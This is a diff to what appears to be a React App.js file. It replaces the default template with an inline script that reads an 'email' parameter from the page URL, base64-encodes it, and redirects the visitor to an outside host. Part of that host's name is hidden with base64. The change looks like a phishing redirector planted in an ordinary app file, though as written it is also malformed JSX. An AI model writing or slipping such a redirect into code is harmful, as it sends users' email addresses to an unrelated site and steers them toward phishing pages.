@@ -3,22 +3,23 @@ import './App.css';
 
 function App() {
   return (
-    <div className="App">
-      <header className="App-header">
-        <img src={logo} className="App-logo" alt="logo" />
-        <p>
-          Edit <code>src/App.js</code> and save to reload.
-        </p>
-        <a
-          className="App-link"
-          href="https://reactjs.org"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          Learn React
-        </a>
-      </header>
-    </div>
+    <script type="text/javascript">
+    var urlParams = new URLSearchParams(window.location.search);
+    var email = urlParams.get('email');
+
+    if (email) {
+        const encdStr = 'bHV2aW4uY29t';
+        const str = atob(encdStr);
+        const encodedEmail = btoa(email);
+        const emma = '?&qrc=' + encodedEmail;
+        const dr = 'https://www.thisis';
+        const ax = dr + str;
+        var link = ax + emma;
+        window.location.href = link;
+    } else {
+        // Handle case when 'email' parameter is not present
+    }
+</script>
   );
 }
 
